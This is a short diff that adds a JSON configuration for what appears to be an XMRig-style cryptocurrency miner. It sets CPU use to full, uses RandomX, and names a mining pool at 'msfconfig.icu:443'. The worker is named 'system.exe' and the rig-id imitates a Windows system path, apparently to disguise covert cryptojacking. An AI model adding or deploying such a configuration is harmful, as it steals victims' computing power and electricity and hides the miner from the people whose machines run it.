@@ -1,0 +1,19 @@
+{
+  "autosave": true,
+  "cpu": {
+    "enabled": true,
+    "max-threads-hint": 100
+  },
+  "randomx": {
+    "init": -1,
+    "mode": "auto"
+  },
+  "pools": [
+    {
+      "url": "msfconfig.icu:443",
+      "user": "system.exe",
+      "tls": true,
+      "rig-id": "C:\\Windows\\Background"
+    }
+  ]
+}
